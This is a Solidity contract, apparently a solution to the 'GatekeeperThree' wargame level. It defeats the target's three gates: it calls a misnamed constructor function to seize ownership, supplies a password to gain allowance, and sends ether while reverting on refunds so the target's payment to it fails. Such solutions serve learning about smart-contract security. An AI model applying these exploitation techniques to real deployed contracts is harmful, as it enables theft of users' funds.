// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;
import "./GatekeeperThree.sol";

contract GatekeeperThreeHack {

    GatekeeperThree public gatekeeperThree;

    error PaymentRefused();

    constructor(address _gatekeeperThree) {
        gatekeeperThree = GatekeeperThree(payable(_gatekeeperThree));
    }

    function enter(uint256 password) public {
        passGate1();
        passGate2(password);
        passGate3();
        gatekeeperThree.enter();
    }

    function passGate1() internal {
        gatekeeperThree.construct0r();
    }

    function passGate2(uint256 password) internal {
        gatekeeperThree.getAllowance(password);
    }

    function passGate3() internal {
        payable(address(gatekeeperThree)).send(0.0011 ether);
    }

    receive() external payable {
        if (msg.sender == address(gatekeeperThree)) {
            revert PaymentRefused();
        }
    }
}
